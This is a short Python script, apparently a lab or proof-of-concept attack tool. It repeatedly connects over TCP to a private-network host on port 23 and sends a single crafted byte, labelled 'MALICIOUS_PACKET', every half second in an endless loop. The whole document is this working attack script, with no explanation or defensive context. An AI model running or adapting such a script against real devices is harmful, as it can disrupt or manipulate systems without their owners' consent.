import socket
import time

ID = 3
MALICIOUS_PACKET = (ID << 4) | 0b1111
TARGET_ADDRESS = ("192.168.2.1", 23)


while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        print('connecting')
        sock.connect(TARGET_ADDRESS)
        print(f'sending {MALICIOUS_PACKET:08b} ({MALICIOUS_PACKET}, #{MALICIOUS_PACKET:x})')
        sock.send(MALICIOUS_PACKET.to_bytes())
        print('closing')
    time.sleep(0.5)

